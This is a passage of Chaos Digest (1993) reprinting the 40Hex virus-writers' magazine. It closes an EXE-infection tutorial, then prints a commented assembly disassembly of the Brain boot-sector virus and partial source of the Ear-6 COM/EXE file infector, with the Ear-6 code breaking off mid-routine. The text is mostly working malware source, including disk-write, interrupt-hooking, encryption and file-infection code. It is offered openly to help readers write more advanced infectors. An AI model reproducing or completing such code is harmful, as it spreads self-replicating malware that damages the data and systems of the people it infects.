the EXE  file simply  consists of  resetting the stack and a far jmp to the
original entry point.

A final  note on  EXE infections: it is often helpful to "pad" EXE files to
the nearest  segment.  This accomplishes two things.  First, the initial IP
is  always  0,  a  fact  which  can  be  used  to  eliminate  delta  offset
calculations.   Code space  can be  saved by  replacing all  those annoying
relative memory  addressing statements  ([bp+offset blip])  statements with
their absolute  counterparts (blip).   Second, recalculation of header info
can be  handled in  paragraphs, simplifying  it tremendously.  The code for
this is left as an exercise for the reader.

This file is dedicated to the [XxXX] (Censored. -Ed.) programmers (who have
yet to figure out how to  write EXE  infectors).  Hopefully, this  text can
teach them (and everyone else) how to progress beyond simple COM and spawn-
ing EXE infectors.   In the next issue of 40Hex,  I will present the theory
and code for the next step of file infector - the coveted SYS file.

+++++

40Hex Number 8 Volume 2 Issue 4                                       File 008

;This is the ashar variant of the classic Pakistani Brain virus. It is large
;by today's standards, although it was one of the first.  It is a floppy only
;boot sector infector.

brain           segment byte public
                assume  cs:brain, ds:brain
;Disassembly done by Dark Angel of PHALCON/SKISM
                org     0

                cli
                jmp     entervirus
idbytes         db       34h, 12h
firsthead       db      0
firstsector     dw      2707h
curhead         db      0
cursector       dw      1
                db      0, 0, 0, 0
                db      'Welcome to the  Dungeon         '
copyright       db      '(c) 1986 Brain'
                db      17h
                db     '& Amjads (pvt) Ltd   VIRUS_SHOE '
                db     ' RECORD   v9.0   Dedicated to th'
                db     'e dynamic memories of millions o'
                db     'f virus who are no longer with u'
                db     's today - Thanks GOODNESS!!     '
                db      '  BEWARE OF THE er..VIRUS  : \th'
                db     'is program is catching      prog'
                db     'ram follows after these messeges'
                db     '..... $'
                db     '#@%$'
                db     '@!! '
entervirus:
                mov     ax,cs
                mov     ds,ax                   ;ds = 0
                mov     ss,ax                   ;set stack to after
                mov     sp,0F000h               ;virus
                sti
                mov     al,ds:[7C00h+offset firsthead]
                mov     ds:[7C00h+offset curhead],al
                mov     cx,ds:[7C00h+offset firstsector]
                mov     ds:[7C00h+offset cursector],cx
                call    calcnext
                mov     cx,5                    ;read five sectors
                mov     bx,7C00h+200h           ;after end of virus

loadnext:
                call    readdisk
                call    calcnext
                add     bx,200h
                loop    loadnext

                mov     ax,word ptr ds:[413h]   ;Base memory size in Kb
                sub     ax,7                    ;- 7 Kb
                mov     word ptr ds:[413h],ax   ;Insert as new value
                mov     cl,6
                shl     ax,cl                   ;Convert to paragraphs
                mov     es,ax
                mov     si,7C00h                ;Copy from virus start
                mov     di,0                    ;to start of memory
                mov     cx,1004h                ;Copy 1004h bytes
                cld
                rep     movsb
                push     es
                mov     ax,200h
                push     ax
                retf                            ;return to old boot sector

readdisk:
                push     cx
                push     bx
                mov     cx,4                    ;Try 4 times

tryread:
                push     cx
                mov     dh,ds:[7C00h+offset curhead]
                mov     dl,0                    ;Read sector from default
                mov     cx,ds:[7C00h+offset cursector]
                mov     ax,201h                 ;Disk to memory at es:bx
                int     13h
                jnc     readOK
                mov     ah,0                    ;Reset disk
                int     13h                     ;(force read track 0)
                pop     cx
                loop    tryread

                int     18h                     ;ROM basic on failure
readOK:
                pop     cx
                pop     bx
                pop     cx
                retn

calcnext:
                mov     al,byte ptr ds:[7C00h+offset cursector]
                inc     al
                mov     byte ptr ds:[7C00h+offset cursector],al
                cmp     al,0Ah
                jne     donecalc
                mov     byte ptr ds:[7C00h+offset cursector],1
                mov     al,ds:[7C00h+offset curhead]
                inc     al
                mov     ds:[7C00h+offset curhead],al
                cmp     al,2
                jne     donecalc
                mov     byte ptr ds:[7C00h+offset curhead],0
                inc     byte ptr ds:[7C00h+offset cursector+1]
donecalc:
                retn

;the following is a collection of garbage bytes
                db       00h, 00h, 00h, 00h, 32h,0E3h
                db       23h, 4Dh, 59h,0F4h,0A1h, 82h
                db      0BCh,0C3h, 12h, 00h, 7Eh, 12h
                db      0CDh, 21h,0A2h, 3Ch, 5Fh
a_data          dw      050Ch
;Second part of the virus begins here
                jmp     short entersecondpart
                db      '(c) 1986 Brain & Amjads (pvt) Ltd ',0
readcounter     db      4                       ;keep track of # reads
curdrive        db      0
int13flag       db      0

entersecondpart:
                mov     cs:readcounter,1Fh
                xor     ax,ax
                mov     ds,ax                   ;ds -> interrupt table
                mov     ax,ds:[13h*4]
                mov     ds:[6Dh*4],ax
                mov     ax,ds:[13h*4+2]
                mov     ds:[6Dh*4+2],ax
                mov     ax,offset int13         ;276h
                mov     ds:[13h*4],ax
                mov     ax,cs
                mov     ds:[13h*4+2],ax
                mov     cx,4                    ;4 tries
                xor     ax,ax
                mov     es,ax                   ;es -> interrupt table

tryreadbootsector:
                push     cx
                mov     dh,cs:firsthead
                mov     dl,0
                mov     cx,cs:firstsector
                mov     ax,201h                 ;read from default disk
                mov     bx,7C00h
                int     6Dh                     ;int 13h
                jnc     readbootOK
                mov     ah,0
                int     6Dh                     ;int 13h
                pop     cx
                loop    tryreadbootsector

                int     18h                     ;ROM basic on failure
readbootOK:                                     ;return control to
                                                ;original boot sector
;*              jmp     far ptr 0000:7C00h
                db     0EAh, 00h, 7Ch, 00h, 00h
                nop                             ;MASM NOP!!!
int13:
                sti
                cmp     ah,2                    ;if not read request,
                jne     doint13                 ;do not go further
                cmp     dl,2                    ;if after second floppy,
                ja      doint13                 ;do not go further
                cmp     ch,0                    ;if not reading boot sector,
                jne     regularread             ;go handle as usual
                cmp     dh,0                    ;if boot sector,
                je      readboot                ;do I<-/>/\|> stuff
regularread:
                dec     cs:readcounter          ;Infect after 4 reads
                jnz     doint13                 ;If counter still OK, don't
                                                ;do anything else
                jmp     short readboot          ;Otherwise, try to infect
doint13:
                jmp     exitint13h
readboot:
;FINISH THIS!
                mov     cs:int13flag,0          ;clear flag
                mov     cs:readcounter,4        ;reset counter
                push     ax
                push     bx
                push     cx
                push     dx
                mov     cs:curdrive,dl
                mov     cx,4

tryreadbootblock:
                push     cx
                mov     ah,0                    ;Reset disk
                int     6Dh
                jc      errorreadingbootblock   ;Try again
                mov     dh,0
                mov     cx,1
                mov     bx,offset readbuffer    ;buffer @ 6BEh
                push    es
                mov     ax,cs
                mov     es,ax
                mov     ax,201h
                int     6Dh                     ;Read boot sector
                pop     es
                jnc     continuestuff           ;continue if no error
errorreadingbootblock:
                pop     cx
                loop    tryreadbootblock

                jmp     short resetdisk         ;too many failures
                nop
continuestuff:
                pop     cx                      ;get system id in boot block
                mov     ax,word ptr cs:[offset readbuffer+4]
                cmp     ax,1234h                ;already infected?
                jne     dodisk                  ;if not, infect it
                mov     cs:int13flag,1          ;flag prev. infection
                jmp     short noreset
dodisk:
                push     ds
                push     es
                mov     ax,cs
                mov     ds,ax
                mov     es,ax
                push     si
                call    writevirus              ;infect the disk
                jc      failme                  ;exit on failure
                mov     cs:int13flag,2          ;flag success
                call    changeroot              ;manipulate volume
label
failme:
                pop     si
                pop     es
                pop     ds
                jnc     noreset                 ;don't reset on success
resetdisk:
                mov     ah,0                    ;reset disk
                int     6Dh                     ;int 13h
noreset:
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                cmp     cx,1
                jne     exitint13h
                cmp     dh,0
                jne     exitint13h
                cmp     cs:int13flag,1          ;already infected?
                jne     wasntinfected           ;if wasn't, go elsewhere
                mov     cx,word ptr cs:[offset readbuffer+7]
                mov     dx,word ptr cs:[offset readbuffer+5]
                mov     dl,cs:curdrive          ;otherwise, read real
                jmp     short exitint13h        ;boot sector
wasntinfected:
                cmp     cs:int13flag,2          ;successful infection?
                jne     exitint13h              ;if not, just do call
                mov     cx,cs:firstsector
                mov     dh,cs:firsthead
exitint13h:
                int     6Dh                     ;int 13h
                retf    2
                db      15 dup (0)

------------------------------

End of Chaos Digest #1.69
************************************

Chaos Digest              Samedi 3 Juillet 1993        Volume 1 : Numero 70
                             ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.70 (3 Juillet 1993)
File 1--40H VMag Number 8 Volume 2 Issue 4 #008(2)-009(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 8 Volume 2 Issue 4 #008(2)-009(1) (reprint)


FATManip:                                       ;returns al as error code
                jmp     short delvedeeper
                nop
FATManipreadcounter dw      3
                db      ' (c) 1986 Brain & Amjads (pvt) Ltd'
delvedeeper:
                call    readFAT                 ;Get FAT ID byte
                mov     ax,word ptr ds:[offset readbuffer]
                cmp     ax,0FFFDh               ;is it 360K disk?
                je      is360Kdisk              ;continue if so
                mov     al,3                    ;al=3 == not good disk
                stc                             ;flag error
                retn                            ;and exit
is360Kdisk:
                mov     cx,37h
                mov     FATManipreadcounter,0   ;none found yet
checknextsector:
                call    FATentry12bit           ;get entry in FAT
                cmp     ax,0                    ;unused?
                jne     notunused
                inc     FATManipreadcounter     ;one more found unused
                cmp     FATManipreadcounter,3   ;If need more,
                jne     tryanother              ; go there
                jmp     short markembad         ;found 3 consecutive
                nop                             ;empty sectors
notunused:
                mov     FATManipreadcounter,0   ;must start over
tryanother:
                inc     cx                      ;try next sector
                cmp     cx,163h                 ;end of disk?
                jne     checknextsector         ;if not, continue
                mov     al,1                    ;al=1 == none empty
                stc                             ;Indicate error
                retn
markembad:
                mov     dl,3                    ;3 times
markanotherbad:
                call    markbad12bit
                dec     cx
                dec     dl
                jnz     markanotherbad
                inc     cx
                call    calc1sttrack
                call    writeFAT                ;update FAT
                mov     al,0                    ;al=0 == ok
                clc                             ;indicate success
                retn

markbad12bit:
                push    cx
                push    dx
                mov     si,offset readbuffer    ;si -> buffer
                mov     al,cl
                shr     al,1
                jc      low_12                  ;low bits
                call    clus2offset12bit
                mov     ax,[bx+si]              ;get FAT entry
                and     ax,0F000h               ;mark it bad
                or      ax,0FF7h
                jmp     short putitback         ;and put it back
                nop
low_12:
                call    clus2offset12bit
                mov     ax,[bx+si]              ;get FAT entry
                and     ax,0Fh                  ;mark it bad
                or      ax,0FF70h
putitback:
                mov     [bx+si],ax              ;replace FAT entry
                mov     word ptr ds:[400h][bx+si],ax ;in two places
                pop     dx
                pop     cx
                retn

FATentry12bit:
                push     cx
                mov     si,offset readbuffer    ;si->buffer
                mov     al,cl
                shr     al,1
;Part 3 of the virus starts here
                jc      want_high_12
                call    clus2offset12bit
                mov     ax,[bx+si]
                and     ax,0FFFh
                jmp     short exitFATentry12bit
                nop
want_high_12:
                call    clus2offset12bit        ;xxxxxxxxxxxx0000
                mov     ax,[bx+si]              ;^^^^^^^^^^^^wanted
                and     ax,0FFF0h               ;mask wanted bits
                mov     cl,4                    ;and move to correct
                shr     ax,cl                   ;position
exitFATentry12bit:
                pop     cx
                retn

clus2offset12bit:
                push    dx
                mov     ax,3
                mul     cx
                shr     ax,1                    ;ax = cx*1.5
                mov     bx,ax
                pop     dx
                retn

readFAT:
                mov     ah,2                    ;read
                call    FAT_IO
                retn

writeFAT:
                mov     ah,3                    ;write
                call    FAT_IO
                retn

FAT_IO:
                mov     cx,4                    ;try four times
FAT_IOLoop:
                push    cx
                push    ax
                mov     ah,0                    ;reset disk
                int     6Dh                     ;int 13h
                pop     ax
                jc      tryFAT_IOagain
                mov     bx,offset readbuffer
                mov     al,4                    ;4 sectors
                mov     dh,0                    ;head 0
                mov     dl,curdrive
                mov     cx,2                    ;sector 2
                push    ax                      ;(FAT)
                int     6Dh                     ;int 13h
                pop     ax
                jnc     exitFAT_IO
tryFAT_IOagain:
                pop     cx
                loop    FAT_IOLoop

                pop     ax
                pop     ax
                mov     al,2
                stc                             ;mark error
                retn
exitFAT_IO:
                pop     cx
                retn

calc1sttrack:
                push    cx
                sub     cx,2
                shl     cx,1                    ;2 sectors/cluster
                add     cx,0Ch                  ;start of data area
                mov     ax,cx                   ;ax = sector
                mov     cl,12h                  ;4096
                div     cl                      ;ax/4096 = al rem ah
                mov     byte ptr firstsector+1,al
                mov     firsthead,0
                inc     ah
                cmp     ah,9                    ;past track 9?
                jbe     notpasttrack9           ;nope, we are ok
                sub     ah,9                    ;otherwise, adjust
                mov     firsthead,1
notpasttrack9:
                mov     byte ptr firstsector,ah
                pop     cx
                retn

                db      0, 0, 0, 0, 0, 0
r_or_w_root     db      3
entrycount      dw      35h

tempsave1       dw      303h
tempsave2       dw      0EBEh
tempsave3       dw      1
tempsave4       dw      100h
                db      0E0h,0D8h, 9Dh,0D7h,0E0h, 9Fh
                db      8Dh, 98h, 9Fh, 8Eh,0E0h
                db      ' (c) ashar $'
changeroot:
                call    readroot                ;read in root directory
                jc      donotchangeroot
                push     di
                call    changevolume            ;change volume label
                pop     di
                jc      donotchangeroot
                call    writeroot               ;write back new root dir
donotchangeroot:
                retn
;The following is just garbage bytes
                db     0BBh, 9Bh, 04h,0B9h, 0Bh
                db      0,8Ah,7,0F6h,0D8h,88h,4,46h,43h
                db      0E2h,0F6h,0B0h,8,88h,4,0F8h,0C3h
                db      0C6h, 06h

changevolume:
                mov     entrycount,6Ch
                mov     si,offset readbuffer+40h;3nd dir entry
                mov     tempsave1,dx
                mov     ax,entrycount           ;6Ch
                shr     ax,1
                mov     tempsave3,ax            ;36h
                shr     ax,1
                mov     tempsave2,ax            ;1Bh
                xchg    ax,cx
                and     cl,43h                  ;cx = 3
                mov     di,tempsave2
                add     di,1E3h                 ;di = 01FE
findlabel:
                mov     al,[si]
                cmp     al,0
                je      dolabel                 ;no mo entries
                mov     al,[si+0Bh]             ;attribute byte
                and     al,8                    ;volume label?
                cmp     al,8                    ;yes?
                je      dolabel                 ;then change it!
                add     si,20h                  ;go to next directory entry
                dec     entrycount
                jnz     findlabel               ;loop back
                stc                             ;Error!
                retn
                db      8Bh
dolabel:
                mov     bx,[di]                 ;offset a_data
                xor     bx,tempsave3            ;bx = 53Ah
                mov     tempsave3,si            ;si->direntry
                cli
                mov     ax,ss
                mov     tempsave1,ax
                mov     tempsave2,sp
                mov     ax,cs
                mov     ss,ax
                mov     sp,tempsave3
                add     sp,0Ch                  ;->reserved area
                mov     cl,51h
                add     dx,444Ch
                mov     di,2555h
                mov     cx,0C03h
                repe    cmpsw
                mov     ax,0B46h
                mov     cx,3
                rol     ax,cl                   ;ax = 5A30h
                mov     tempsave3,ax
                mov     cx,5
                mov     dx,8
                sub     tempsave3,5210h         ;820h
                push    tempsave3               ;store attributes/reserved
;I haven't commented the remainder of this procedure.
;It basically changes the volume label to read "(c) Brain"

;Comment mode OFF

dowhatever:
                mov     ah,[bx]                 ;5a3h
                inc     bx
                mov     dl,ah
                shl     dl,1
                jc      dowhatever
searchstuff:
                mov     dl,[bx]                 ;dl=C2h
                inc     bx                      ;bx=53Eh
                mov     al,dl
                shl     dl,1
                jc      searchstuff
                add     ax,1D1Dh
                push     ax
                inc     tempsave3
                db       73h, 01h               ;jnc $+3
                db      0EAh,0E2h,0E1h, 8Bh, 26h;jmp 268B:E1E2
                xchg    bp,ax
                add     al,0A1h
                xchg    bx,ax
                add     al,8Eh
                sar     bl,1
                add     dh,[bp+si]
                clc
                ret
                ;db       95h, 04h,0A1h, 93h, 04h, 8Eh
                ;db      0D0h,0FBh, 02h, 32h,0F8h,0C3h

;Comment mode ON

readroot:
                mov     r_or_w_root,2           ;set action code
                jmp     short do_rw_root        ;easier to do w/
                nop                             ;mov ah, 2
writeroot:
                mov     r_or_w_root,3
                jmp     short do_rw_root        ;this is somewhat useless
                nop
do_rw_root:
                mov     dh,0                    ;head 0
                mov     dl,curdrive
                mov     cx,6                    ;sector 6
                mov     ah,r_or_w_root
                mov     al,4                    ;4 sectors
                mov     bx,offset readbuffer
                call    doint13h
                jc      exit_rw_root            ;quit on error
                mov     cx,1
                mov     dh,1                    ;head 1
                mov     ah,r_or_w_root
                mov     al,3
                add     bx,800h
                call    doint13h

exit_rw_root:
                retn

doint13h:
                mov     tempsave1,ax
                mov     tempsave2,bx
                mov     tempsave3,cx
                mov     tempsave4,dx
                mov     cx,4

doint13hloop:
                push    cx
                mov     ah,0                    ;Reset disk
                int     6Dh
                jc      errordoingint13h
                mov     ax,tempsave1
                mov     bx,tempsave2
                mov     cx,tempsave3
                mov     dx,tempsave4
                int     6Dh                     ;int 13h
                jnc     int13hsuccess
errordoingint13h:
                pop     cx
                loop    doint13hloop

                stc                             ;indicate error
                retn
int13hsuccess:
                pop     cx
                retn

                db      0, 0, 0
;Part 4 of the virus starts here
tempstorecx     dw      3
readwritecurrentdata    dw      301h

writevirus:
                call    FATManip
                jc      exitwritevirus
                mov     cursector,1
                mov     curhead,0
                mov     bx,offset readbuffer
                call    readcurrent
                mov     bx,offset readbuffer
                mov     ax,firstsector
                mov     cursector,ax
                mov     ah,firsthead
                mov     curhead,ah
                call    writecurrent
                call    calcnextsector
                mov     cx,5
                mov     bx,200h
writeanothersector:
                mov     tempstorecx,cx
                call    writecurrent
                call    calcnextsector
                add     bx,200h
                mov     cx,tempstorecx
                loop    writeanothersector

                mov     curhead,0
                mov     cursector,1
                mov     bx,0
                call    writecurrent
                clc                             ;indicate success
exitwritevirus:
                retn

readcurrent:
                mov     readwritecurrentdata,201h
                jmp     short doreadwrite
                nop
writecurrent:
                mov     readwritecurrentdata,301h
                jmp     short doreadwrite       ;This is pointless.
                nop
doreadwrite:
                push    bx
                mov     cx,4

tryreadwriteagain:
                push    cx
                mov     dh,curhead
                mov     dl,curdrive
                mov     cx,cursector
                mov     ax,readwritecurrentdata ;read or write?
                int     6Dh                     ;int 13h
                jnc     readwritesuccessful
                mov     ah,0                    ;reset disk
                int     6Dh                     ;int 13h
                pop     cx
                loop    tryreadwriteagain

                pop     bx
                pop     bx
                stc                             ;Indicate error
                retn
readwritesuccessful:
                pop     cx
                pop     bx
                retn

calcnextsector:
                inc     byte ptr cursector      ;next sector
                cmp     byte ptr cursector,0Ah
                jne     donecalculate           ;finished calculations
                mov     byte ptr cursector,1    ;clear sector #
                inc     curhead                 ;and go to next head
                cmp     curhead,2               ;if not too large,
                jne     donecalculate           ;we are done
                mov     curhead,0               ;otherwise clear head #
                inc     byte ptr cursector+1    ;and advance cylinder
donecalculate:
                retn

                db      64h, 74h, 61h

;read buffer starts here
;insert your favorite boot block below...
readbuffer:
brain           ends
                end

+++++

40Hex Number 8 Volume 2 Issue 4                                     File 009

                  -=PHALCON/SKISM=- Ear-6 Virus

    The Ear-6 is a parasitic, non-resident, .COM & .EXE infector.  It
infects 5 files everytime it is run.  It will traverse towards the root
directory if fewer than 5 files are found.  We have no clue as to what
the 'AUX error' that Patti talks about.  But then again, Patti isn't
sure as to who she is, let alone an accurate discription on one of our
virii.  On activation (1st of any month), it plays ear quiz with
victim.  Failure to answer the question will result in program
termination.
                                        -) Gheap

---------------------------------------------------------------------------
;[Ear-6]

;El virus de oreja y oido seis
;Fue escrito por Dark Angel de PHALCON/SKISM
;Yo (el angel oscuro) escribi este programa hace muchas semanas.
;No deba modificar este programa y da a otras personas COMO SI
;estara el suyo.

;?Donde esta mi llama, mama?

;                      diccionarito
;espanol       ingles                   magnitud      size
;abre          open                     mango         handle
;aprueba       pass (a test)            mascara       mask
;atras         back                     mensaje       message
;azado         random                   mes           month
;busca         find                     monton        heap
;cierra        close                    oreja, oido   ear
;cifra         code, encrypt, decrypt   pila          stack
;codo          pointer                  pregunta      question
;corto         terse, short             primer        first
;empieza       begin                    remendar      patch
;escriba       write                    renuncia      reject
;espanol       ingles                   respuesta     answer
;fecha         date                     salta         exit
;ficha         file                     siguiente     following, next
;indice        table                    suspende      fail (a test)
;?le gusta?    do you like?             termina       end
;longitud      length                   virus         virus (!)

.model tiny
.code
org     100h

longitud_del_virus = TerminaVir - EmpezarVir
longitud_del_escribir = offset termina_escribir - offset escribir

id = 'GH'                                       ;Representa el lider de
                                                ;PHALCON/SKISM, Garbageheap
Empezar:  db      0e9h, 0, 0                    ;jmp EmpezarVir

EmpezarVir:
shwing:
remendar1:
        mov     bx, offset EmpezarCifra
remendar2:
        mov     cx, ((longitud_del_virus + 1) / 2)
hacia_atras:    ;atras
        db      2eh
remendar3:
        db      81h, 37h, 0, 0                  ;xor word ptr cs:[bx], 0
        add     bx, 2
        loop    hacia_atras
EmpezarCifra:

        call    siguiente                       ;Es estupido, pero es corto
siguiente:
        pop     bp
        sub     bp, offset siguiente

        mov     byte ptr [bp+numinf], 0

        cld                                     ;No es necessario, pero
                                                ;?por que no?
        cmp     sp, id
        jz      SoyEXE
SoyCOM: mov     di, 100h
        push    di
        lea     si, [bp+Primer3]
        movsb
        jmp     short SoyNada
SoyEXE: push    ds
        push    es
        push    cs
        push    cs
        pop     ds
        pop     es

        lea     di, [bp+EXE_Donde_JMP]  ;el CS:IP original de la ficha
        lea     si, [bp+EXE_Donde_JMP2] ;infectada
        movsw
        movsw
        movsw

        jmp     short SoyNada

NombreDelVirus  db  0,'[Ear-6]',0               ;En ingles, !por supuesto!
NombreDelAutor  db  'Dark Angel',0

SoyNada:
        movsw

        mov     ah, 1ah                         ;Esindicece un DTA nuevo
        lea     dx, [bp+offset nuevoDTA]        ;porque no quiere destruir
        int     21h                             ;el DTA original

        mov     ax, word ptr [bp+remendar1+1]
        mov     word ptr [bp+tempo], ax

        mov     ah, 47h                         ;Obtiene el directorio
        xor     dl, dl                          ;presente
        lea     si, [bp+diroriginal]
        int     21h

looper:
        lea     dx, [bp+offset mascara1]        ;"mascara", no "mascara"
        call    infectar_mascara                ;pero no es possible usar
                                                ;acentos en MASM/TASM.
                                                ;!Que lastima!
                                                ;mascara1 es '*.EXE',0
        lea     dx, [bp+offset mascara2]        ;mascara2 es '*.COM',0
        call    infectar_mascara                ;infecta las fichas de COM

        cmp     byte ptr [bp+numinf], 5         ;?Ha infectada cinco fichas?
        jg      saltar                          ;Si es verdad, no necesita
                                                ;busca mas fichas.
        mov     ah, 3bh                         ;Cambia el directorio al
        lea     dx, [bp+puntos]                 ;directorio anterior
        int     21h                             ;('..', 'punto punto')
        jnc     looper

saltar: lea     dx, [bp+backslash]              ;Cambia el directorio al
        mov     ah, 3bh                         ;directorio terminado.
        int     21h

        mov     ah, 2ah                         ;Activa el primer de
        int     21h                             ;cada mes
        cmp     dl, 1                           ;Si no es el primer,
        jnz     saltarahora                     ;!saltar ahora! (duh-o)

        mov     ah, 2ch                         ;?Que hora es?
        int     21h

        cmp     dl, 85                          ;85% probabilidad de
        jg      saltarahora                     ;activacion

        and     dx, 7                           ;Un numero quasi-azado
        shl     dl, 1                           ;Usalo para determinar
        mov     bx, bp                          ;que preguntara la virus
        add     bx, dx
        mov     dx, word ptr [bx+indice]        ;indice para el examencito
        add     dx, bp
        inc     dx
        push    dx                              ;Salva el codo al pregunta

        mov     ah, 9                           ;Escriba el primer parte de
        lea     dx, [bp+mensaje]                ;la pregunta
        int     21h

        pop     dx                              ;Escriba el parte de la oreja
        int     21h                             ;o el oido
        dec     dx
        push    dx                              ;Salva la respuesta correcta

        lea     dx, [bp+secciones]              ;Escriba los secciones de la
        int     21h                             ;oreja y el oido

trataotrarespuesta:
        mov     ah, 7                           ;Obtiene la respuesta de la
        int     21h                             ;"victima"
        cmp     al, '1'                         ;Necesita una respuesta de
        jl      trataotrarespuesta              ;uno hasta tres
        cmp     al, '3'                         ;Renuncia otras respuestas
        jg      trataotrarespuesta

        int     29h                             ;Escriba la respuesta

        pop     bx                              ;El codo al respuesta
                                                ;correcta
        mov     ah, 9                           ;Prepara a escribir un
                                                ;mensaje
        cmp     al, byte ptr [bx]               ;?Es correcta?
        jz      saltarapidamente                ;El aprueba el examencito.
                                                ;Pues, salta rapidamente.
        lea     dx, [bp+suspendido]             ;Lo siento, pero !Ud. no
        int     21h                             ;aprueba el examencito facil!

        mov     ah, 4ch                         ;Estudie mas y el programa
        jmp     quite                           ;permitira a Ud a continuar.

saltarapidamente:
        lea     dx, [bp+aprueba]
        int     21h
saltarahora:
        mov     ah, 1ah                         ;Restaura el DTA original
        mov     dx, 80h
quite:
        cmp     sp, id - 4                      ;?Es EXE o COM?
        jz      vuelvaEXE
vuelvaCOM:
        int     21h                             ;Restaura el DTA y vuelva
        retn                                    ;a la ficha original de COM

vuelvaEXE:
        pop     es
        pop     ds                              ;ds -> PSP

        int     21h

        mov     ax, es
        add     ax, 10h                         ;Ajusta para el PSP
        add     word ptr cs:[bp+EXE_Donde_JMP+2], ax
        cli
        add     ax, word ptr cs:[bp+PilaOriginal+2]
        mov     ss, ax
        mov     sp, word ptr cs:[bp+PilaOriginal]
        sti
        db      0eah                            ;JMP FAR PTR SEG:OFF
EXE_Donde_JMP dd 0
PilaOriginal  dd 0

EXE_Donde_JMP2  dd 0
PilaOriginal2   dd 0

infectar_mascara:
        mov     ah, 4eh                         ;Busca la ficha primera
        mov     cx, 7                           ;Cada atributo
brb_brb:
        int     21h
        jc      hasta_la_vista_bebe             ;No la busca

        xor     al, al
        call    abrir                           ;Abre la ficha

        mov     ah, 3fh
        mov     cx, 1ah
        lea     dx, [bp+buffer]
        int     21h

        mov     ah, 3eh                         ;Cierra la ficha
        int     21h

        lea     si,[bp+nuevoDTA+15h]            ;Salva cosas sobre la ficha
        lea     di,[bp+f_atrib]                 ;Por ejemplo, la fecha de
        mov     cx, 9                           ;creacion
        rep     movsb

------------------------------

End of Chaos Digest #1.70
************************************

Chaos Digest              Dimanche 4 Juillet 1993        Volume 1 : Numero 71
                              ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.71 (4 Juillet 1993)
File 1--40H VMag Number 8 Volume 2 Issue 4 #009(2)-010 (reprint)
File 2--Bien choisir son mot de passe (produit)
File 3--171892 FF depense sur une telecarte de 150 unites (communique)
File 4--"Computer Virus Desk Reference" de Chris Feudo (critique)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 8 Volume 2 Issue 4 #009(2)-010 (reprint)


        cmp     word ptr [bp+buffer], 'ZM'      ;?Es EXE o COM?
        jz      buscaEXE
buscaCOM:
        mov     ax, word ptr [bp+f_long]        ;?Cuan grande es la ficha?
        sub     ax, longitud_del_virus + 3      ;Adjusta para el JMP
